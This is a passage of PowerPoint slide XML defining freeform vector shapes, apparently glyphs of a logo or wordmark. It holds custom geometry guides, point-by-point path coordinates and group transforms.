                      <a:pt x="18" y="89"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="18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23" name="Freeform 146">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FA6FD853-0A57-4050-858C-035564D7C41C}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks noEditPoints="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="5455353" y="2162736"/>
                <a:ext cx="141728" cy="128843"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 165"/>
                  <a:gd name="T1" fmla="*/ 75 h 150"/>
                  <a:gd name="T2" fmla="*/ 4 w 165"/>
                  <a:gd name="T3" fmla="*/ 50 h 150"/>
                  <a:gd name="T4" fmla="*/ 19 w 165"/>
                  <a:gd name="T5" fmla="*/ 25 h 150"/>
                  <a:gd name="T6" fmla="*/ 31 w 165"/>
                  <a:gd name="T7" fmla="*/ 15 h 150"/>
                  <a:gd name="T8" fmla="*/ 45 w 165"/>
                  <a:gd name="T9" fmla="*/ 7 h 150"/>
                  <a:gd name="T10" fmla="*/ 62 w 165"/>
                  <a:gd name="T11" fmla="*/ 1 h 150"/>
                  <a:gd name="T12" fmla="*/ 83 w 165"/>
                  <a:gd name="T13" fmla="*/ 0 h 150"/>
                  <a:gd name="T14" fmla="*/ 102 w 165"/>
                  <a:gd name="T15" fmla="*/ 1 h 150"/>
                  <a:gd name="T16" fmla="*/ 131 w 165"/>
                  <a:gd name="T17" fmla="*/ 11 h 150"/>
                  <a:gd name="T18" fmla="*/ 152 w 165"/>
                  <a:gd name="T19" fmla="*/ 29 h 150"/>
                  <a:gd name="T20" fmla="*/ 160 w 165"/>
                  <a:gd name="T21" fmla="*/ 42 h 150"/>
                  <a:gd name="T22" fmla="*/ 165 w 165"/>
                  <a:gd name="T23" fmla="*/ 71 h 150"/>
                  <a:gd name="T24" fmla="*/ 164 w 165"/>
                  <a:gd name="T25" fmla="*/ 88 h 150"/>
                  <a:gd name="T26" fmla="*/ 152 w 165"/>
                  <a:gd name="T27" fmla="*/ 116 h 150"/>
                  <a:gd name="T28" fmla="*/ 137 w 165"/>
                  <a:gd name="T29" fmla="*/ 133 h 150"/>
                  <a:gd name="T30" fmla="*/ 124 w 165"/>
                  <a:gd name="T31" fmla="*/ 141 h 150"/>
                  <a:gd name="T32" fmla="*/ 108 w 165"/>
                  <a:gd name="T33" fmla="*/ 148 h 150"/>
                  <a:gd name="T34" fmla="*/ 91 w 165"/>
                  <a:gd name="T35" fmla="*/ 150 h 150"/>
                  <a:gd name="T36" fmla="*/ 82 w 165"/>
                  <a:gd name="T37" fmla="*/ 150 h 150"/>
                  <a:gd name="T38" fmla="*/ 61 w 165"/>
                  <a:gd name="T39" fmla="*/ 149 h 150"/>
                  <a:gd name="T40" fmla="*/ 44 w 165"/>
                  <a:gd name="T41" fmla="*/ 144 h 150"/>
                  <a:gd name="T42" fmla="*/ 31 w 165"/>
                  <a:gd name="T43" fmla="*/ 136 h 150"/>
                  <a:gd name="T44" fmla="*/ 19 w 165"/>
                  <a:gd name="T45" fmla="*/ 125 h 150"/>
                  <a:gd name="T46" fmla="*/ 4 w 165"/>
                  <a:gd name="T47" fmla="*/ 102 h 150"/>
                  <a:gd name="T48" fmla="*/ 0 w 165"/>
                  <a:gd name="T49" fmla="*/ 75 h 150"/>
                  <a:gd name="T50" fmla="*/ 135 w 165"/>
                  <a:gd name="T51" fmla="*/ 79 h 150"/>
                  <a:gd name="T52" fmla="*/ 135 w 165"/>
                  <a:gd name="T53" fmla="*/ 63 h 150"/>
                  <a:gd name="T54" fmla="*/ 125 w 165"/>
                  <a:gd name="T55" fmla="*/ 38 h 150"/>
                  <a:gd name="T56" fmla="*/ 110 w 165"/>
                  <a:gd name="T57" fmla="*/ 21 h 150"/>
                  <a:gd name="T58" fmla="*/ 90 w 165"/>
                  <a:gd name="T59" fmla="*/ 11 h 150"/>
                  <a:gd name="T60" fmla="*/ 78 w 165"/>
                  <a:gd name="T61" fmla="*/ 11 h 150"/>
                  <a:gd name="T62" fmla="*/ 61 w 165"/>
                  <a:gd name="T63" fmla="*/ 12 h 150"/>
                  <a:gd name="T64" fmla="*/ 45 w 165"/>
                  <a:gd name="T65" fmla="*/ 23 h 150"/>
                  <a:gd name="T66" fmla="*/ 33 w 165"/>
                  <a:gd name="T67" fmla="*/ 40 h 150"/>
                  <a:gd name="T68" fmla="*/ 29 w 165"/>
                  <a:gd name="T69" fmla="*/ 70 h 150"/>
                  <a:gd name="T70" fmla="*/ 31 w 165"/>
                  <a:gd name="T71" fmla="*/ 84 h 150"/>
                  <a:gd name="T72" fmla="*/ 38 w 165"/>
                  <a:gd name="T73" fmla="*/ 109 h 150"/>
                  <a:gd name="T74" fmla="*/ 54 w 165"/>
                  <a:gd name="T75" fmla="*/ 128 h 150"/>
                  <a:gd name="T76" fmla="*/ 77 w 165"/>
                  <a:gd name="T77" fmla="*/ 138 h 150"/>
                  <a:gd name="T78" fmla="*/ 90 w 165"/>
                  <a:gd name="T79" fmla="*/ 140 h 150"/>
                  <a:gd name="T80" fmla="*/ 103 w 165"/>
                  <a:gd name="T81" fmla="*/ 138 h 150"/>
                  <a:gd name="T82" fmla="*/ 117 w 165"/>
                  <a:gd name="T83" fmla="*/ 131 h 150"/>
                  <a:gd name="T84" fmla="*/ 131 w 165"/>
                  <a:gd name="T85" fmla="*/ 112 h 150"/>
                  <a:gd name="T86" fmla="*/ 135 w 165"/>
                  <a:gd name="T87" fmla="*/ 79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65" h="150">
                    <a:moveTo>
                      <a:pt x="0" y="75"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="0" y="75"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="62"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="50"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="11" y="37"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="25"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="24" y="20"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="31" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="37" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="62" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="73" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="102" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="117" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="131" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="142" y="20"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="152" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="156" y="36"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="160" y="42"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="164" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="165" y="71"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="165" y="71"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="164" y="88"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="160" y="103"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="152" y="116"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="142" y="128"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="137" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="131" y="137"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="124" y="141"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="108" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="99" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="82" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="82" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="71" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="61" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="44" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="37" y="140"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="31" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="24" y="131"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="125"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="11" y="115"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="102"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="88"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="75"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="75"/>
                    </a:lnTo>
                    <a:close/>
                    <a:moveTo>
                      <a:pt x="135" y="79"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="135" y="79"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="135" y="63"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="131" y="50"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="125" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="119" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="110" y="21"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="78" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="78" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="69" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="61" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="23"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="38" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="40"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="31" y="53"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="29" y="70"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="29" y="70"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="31" y="84"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="98"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="38" y="109"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="120"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="128"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="65" y="134"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="77" y="138"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="140"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="90" y="140"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="95" y="140"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="103" y="138"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="110" y="136"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="117" y="131"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="124" y="123"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="131" y="112"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="133" y="98"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="135" y="79"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="135" y="7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24" name="Freeform 147">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C59A3AC9-8FAD-4B36-A25E-CBE868292E7D}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="5601375" y="2161877"/>
                <a:ext cx="145164" cy="129702"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 36 w 169"/>
                  <a:gd name="T1" fmla="*/ 122 h 151"/>
                  <a:gd name="T2" fmla="*/ 37 w 169"/>
                  <a:gd name="T3" fmla="*/ 138 h 151"/>
                  <a:gd name="T4" fmla="*/ 42 w 169"/>
                  <a:gd name="T5" fmla="*/ 143 h 151"/>
                  <a:gd name="T6" fmla="*/ 48 w 169"/>
                  <a:gd name="T7" fmla="*/ 145 h 151"/>
                  <a:gd name="T8" fmla="*/ 53 w 169"/>
                  <a:gd name="T9" fmla="*/ 145 h 151"/>
                  <a:gd name="T10" fmla="*/ 55 w 169"/>
                  <a:gd name="T11" fmla="*/ 147 h 151"/>
                  <a:gd name="T12" fmla="*/ 54 w 169"/>
                  <a:gd name="T13" fmla="*/ 149 h 151"/>
                  <a:gd name="T14" fmla="*/ 51 w 169"/>
                  <a:gd name="T15" fmla="*/ 149 h 151"/>
                  <a:gd name="T16" fmla="*/ 25 w 169"/>
                  <a:gd name="T17" fmla="*/ 149 h 151"/>
                  <a:gd name="T18" fmla="*/ 4 w 169"/>
                  <a:gd name="T19" fmla="*/ 149 h 151"/>
                  <a:gd name="T20" fmla="*/ 0 w 169"/>
                  <a:gd name="T21" fmla="*/ 149 h 151"/>
                  <a:gd name="T22" fmla="*/ 0 w 169"/>
                  <a:gd name="T23" fmla="*/ 147 h 151"/>
                  <a:gd name="T24" fmla="*/ 3 w 169"/>
                  <a:gd name="T25" fmla="*/ 145 h 151"/>
                  <a:gd name="T26" fmla="*/ 12 w 169"/>
                  <a:gd name="T27" fmla="*/ 145 h 151"/>
                  <a:gd name="T28" fmla="*/ 15 w 169"/>
                  <a:gd name="T29" fmla="*/ 142 h 151"/>
                  <a:gd name="T30" fmla="*/ 17 w 169"/>
                  <a:gd name="T31" fmla="*/ 132 h 151"/>
                  <a:gd name="T32" fmla="*/ 20 w 169"/>
                  <a:gd name="T33" fmla="*/ 6 h 151"/>
                  <a:gd name="T34" fmla="*/ 21 w 169"/>
                  <a:gd name="T35" fmla="*/ 2 h 151"/>
                  <a:gd name="T36" fmla="*/ 24 w 169"/>
                  <a:gd name="T37" fmla="*/ 0 h 151"/>
                  <a:gd name="T38" fmla="*/ 25 w 169"/>
                  <a:gd name="T39" fmla="*/ 1 h 151"/>
                  <a:gd name="T40" fmla="*/ 32 w 169"/>
                  <a:gd name="T41" fmla="*/ 6 h 151"/>
                  <a:gd name="T42" fmla="*/ 94 w 169"/>
                  <a:gd name="T43" fmla="*/ 68 h 151"/>
                  <a:gd name="T44" fmla="*/ 136 w 169"/>
                  <a:gd name="T45" fmla="*/ 112 h 151"/>
                  <a:gd name="T46" fmla="*/ 134 w 169"/>
                  <a:gd name="T47" fmla="*/ 26 h 151"/>
                  <a:gd name="T48" fmla="*/ 134 w 169"/>
                  <a:gd name="T49" fmla="*/ 18 h 151"/>
                  <a:gd name="T50" fmla="*/ 132 w 169"/>
                  <a:gd name="T51" fmla="*/ 10 h 151"/>
                  <a:gd name="T52" fmla="*/ 128 w 169"/>
                  <a:gd name="T53" fmla="*/ 9 h 151"/>
                  <a:gd name="T54" fmla="*/ 117 w 169"/>
                  <a:gd name="T55" fmla="*/ 8 h 151"/>
                  <a:gd name="T56" fmla="*/ 115 w 169"/>
                  <a:gd name="T57" fmla="*/ 6 h 151"/>
                  <a:gd name="T58" fmla="*/ 115 w 169"/>
                  <a:gd name="T59" fmla="*/ 5 h 151"/>
                  <a:gd name="T60" fmla="*/ 116 w 169"/>
                  <a:gd name="T61" fmla="*/ 4 h 151"/>
                  <a:gd name="T62" fmla="*/ 120 w 169"/>
                  <a:gd name="T63" fmla="*/ 4 h 151"/>
                  <a:gd name="T64" fmla="*/ 145 w 169"/>
                  <a:gd name="T65" fmla="*/ 4 h 151"/>
                  <a:gd name="T66" fmla="*/ 165 w 169"/>
                  <a:gd name="T67" fmla="*/ 4 h 151"/>
                  <a:gd name="T68" fmla="*/ 169 w 169"/>
                  <a:gd name="T69" fmla="*/ 5 h 151"/>
                  <a:gd name="T70" fmla="*/ 169 w 169"/>
                  <a:gd name="T71" fmla="*/ 6 h 151"/>
                  <a:gd name="T72" fmla="*/ 166 w 169"/>
                  <a:gd name="T73" fmla="*/ 8 h 151"/>
                  <a:gd name="T74" fmla="*/ 159 w 169"/>
                  <a:gd name="T75" fmla="*/ 8 h 151"/>
                  <a:gd name="T76" fmla="*/ 154 w 169"/>
                  <a:gd name="T77" fmla="*/ 13 h 151"/>
                  <a:gd name="T78" fmla="*/ 153 w 169"/>
                  <a:gd name="T79" fmla="*/ 24 h 151"/>
                  <a:gd name="T80" fmla="*/ 150 w 169"/>
                  <a:gd name="T81" fmla="*/ 146 h 151"/>
                  <a:gd name="T82" fmla="*/ 146 w 169"/>
                  <a:gd name="T83" fmla="*/ 151 h 151"/>
                  <a:gd name="T84" fmla="*/ 142 w 169"/>
                  <a:gd name="T85" fmla="*/ 150 h 151"/>
                  <a:gd name="T86" fmla="*/ 138 w 169"/>
                  <a:gd name="T87" fmla="*/ 147 h 151"/>
                  <a:gd name="T88" fmla="*/ 80 w 169"/>
                  <a:gd name="T89" fmla="*/ 92 h 151"/>
                  <a:gd name="T90" fmla="*/ 34 w 169"/>
                  <a:gd name="T91" fmla="*/ 45 h 151"/>
                  <a:gd name="T92" fmla="*/ 36 w 169"/>
                  <a:gd name="T93" fmla="*/ 122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69" h="151">
                    <a:moveTo>
                      <a:pt x="36" y="122"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="36" y="122"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="37" y="138"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="40" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="51" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="51" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="25" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="25" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="12" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="12" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="138"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="121"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="21" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="24" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="24" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="25" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="28" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="32" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="32" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="68"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="68"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="112"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="137" y="112"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="134" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="134" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="134" y="18"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="133" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="132" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="128" y="9"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="128" y="9"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="123" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="117" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="117" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="115" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="115" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="115" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="115" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="120" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="120" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="145" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="145" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="165" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="165" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="167" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="169" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="169" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="169" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="166" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="166" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="159" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="159" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="156" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="154" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="153" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="153" y="24"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="150" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="150" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="149" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="146" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="146" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="142" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="138" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="138" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="80" y="92"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="80" y="92"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="62"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="34" y="45"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="45"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36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532B0966-B474-43DA-9941-C7697E9F8CF6}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="black">
            <a:xfrm>
              <a:off x="4772119" y="5391353"/>
              <a:ext cx="1534797" cy="328077"/>
              <a:chOff x="4709780" y="2337103"/>
              <a:chExt cx="699189" cy="149458"/>
            </a:xfrm>
            <a:grpFill/>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="7" name="Freeform 148">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F137099E-E823-41A8-9890-E934600F834E}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks noEditPoints="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="4709780" y="2337103"/>
                <a:ext cx="158907" cy="149458"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 23 w 185"/>
                  <a:gd name="T1" fmla="*/ 66 h 174"/>
                  <a:gd name="T2" fmla="*/ 23 w 185"/>
                  <a:gd name="T3" fmla="*/ 17 h 174"/>
                  <a:gd name="T4" fmla="*/ 20 w 185"/>
                  <a:gd name="T5" fmla="*/ 9 h 174"/>
                  <a:gd name="T6" fmla="*/ 12 w 185"/>
                  <a:gd name="T7" fmla="*/ 5 h 174"/>
                  <a:gd name="T8" fmla="*/ 3 w 185"/>
                  <a:gd name="T9" fmla="*/ 4 h 174"/>
                  <a:gd name="T10" fmla="*/ 0 w 185"/>
                  <a:gd name="T11" fmla="*/ 4 h 174"/>
                  <a:gd name="T12" fmla="*/ 0 w 185"/>
                  <a:gd name="T13" fmla="*/ 3 h 174"/>
                  <a:gd name="T14" fmla="*/ 4 w 185"/>
                  <a:gd name="T15" fmla="*/ 0 h 174"/>
                  <a:gd name="T16" fmla="*/ 37 w 185"/>
                  <a:gd name="T17" fmla="*/ 1 h 174"/>
                  <a:gd name="T18" fmla="*/ 73 w 185"/>
                  <a:gd name="T19" fmla="*/ 0 h 174"/>
                  <a:gd name="T20" fmla="*/ 95 w 185"/>
                  <a:gd name="T21" fmla="*/ 0 h 174"/>
                  <a:gd name="T22" fmla="*/ 119 w 185"/>
                  <a:gd name="T23" fmla="*/ 3 h 174"/>
                  <a:gd name="T24" fmla="*/ 143 w 185"/>
                  <a:gd name="T25" fmla="*/ 10 h 174"/>
                  <a:gd name="T26" fmla="*/ 164 w 185"/>
                  <a:gd name="T27" fmla="*/ 26 h 174"/>
                  <a:gd name="T28" fmla="*/ 172 w 185"/>
                  <a:gd name="T29" fmla="*/ 36 h 174"/>
                  <a:gd name="T30" fmla="*/ 181 w 185"/>
                  <a:gd name="T31" fmla="*/ 57 h 174"/>
                  <a:gd name="T32" fmla="*/ 185 w 185"/>
                  <a:gd name="T33" fmla="*/ 74 h 174"/>
                  <a:gd name="T34" fmla="*/ 185 w 185"/>
                  <a:gd name="T35" fmla="*/ 83 h 174"/>
                  <a:gd name="T36" fmla="*/ 183 w 185"/>
